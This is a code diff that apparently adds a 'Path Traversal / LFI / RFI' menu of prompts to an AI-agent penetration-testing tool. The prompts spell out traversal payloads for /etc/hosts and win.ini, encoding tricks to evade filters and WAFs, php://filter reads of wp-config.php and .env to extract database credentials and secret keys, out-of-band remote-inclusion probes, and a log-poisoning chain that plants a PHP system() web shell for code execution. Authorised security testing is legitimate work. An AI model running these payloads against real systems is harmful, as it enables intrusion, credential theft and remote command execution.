@@ -280,6 +280,23 @@ export const EXPLOITATION_GROUPS: SESubGroup[] = [
     ],
   },
   {
+    id: 'path_traversal',
+    title: 'Path Traversal / LFI / RFI',
+    items: [
+      {
+        suggestions: [
+          { label: 'Probe download endpoints for path traversal', prompt: 'Query the graph for endpoints with file or path parameters (file=, path=, download=, export=, view=). Use execute_curl to send canonical traversal payloads (../../../../etc/hosts on Unix, ..\\\\..\\\\..\\\\Windows\\\\win.ini on Windows) and confirm a content match against a control read of an in-root file from the same endpoint.' },
+          { label: 'Bypass naive ../ filter via encoding', prompt: 'For the candidate endpoint identified earlier, escalate when plain ../ is filtered: try URL-encoded slashes (..%2f), encoded dots (%2e%2e%2f), double-encoded variants (..%252f), the ....// double-dot fold, and the /static/..;/ nginx parser-mismatch. Report which form the WAF or normaliser missed.' },
+          { label: 'PHP wrapper source disclosure', prompt: 'When the target is PHP and basic traversal is filtered, use execute_curl with php://filter/convert.base64-encode/resource=index.php (and wp-config.php, .env) to exfiltrate source verbatim. Decode the base64 via execute_code and surface DB credentials, SECRET_KEY, and included files.' },
+          { label: 'Blind LFI / RFI via interactsh OOB', prompt: 'Start interactsh-client in kali_shell, capture the registered domain, then test the inclusion sink with http://REGISTERED_DOMAIN/ probes plus //REGISTERED_DOMAIN/ and ftp://REGISTERED_DOMAIN/ variants. A DNS hit confirms reachability; an HTTP hit confirms remote inclusion.' },
+          { label: 'Log poisoning chain to RCE', prompt: 'Identify a writable web-server log via path traversal (var/log/apache2/access.log or var/log/nginx/access.log). Send a request with a User-Agent of <?php system($_GET[\\\"c\\\"]); ?> via execute_curl, then include the log through the LFI sink with &c=id appended. Capture the command output.' },
+          { label: 'Fuzz hidden file parameters with ffuf', prompt: 'Use execute_arjun on the candidate endpoint to surface hidden file/path/template parameters, then run execute_ffuf with the raft-medium-directories wordlist as FUZZ values to enumerate which paths the sink will read. Filter on response size and code.' },
+          { label: 'Run Nuclei LFI templates', prompt: 'Run execute_nuclei -u http://TARGET -tags lfi,fileinclusion,traversal -severity critical,high,medium against the target to surface known LFI / path-traversal CVEs and template patterns. Cross-reference findings with the graph.' },
+        ],
+      },
+    ],
+  },
+  {
     id: 'manual_exploit',
     title: 'Manual Exploitation',
     items: [
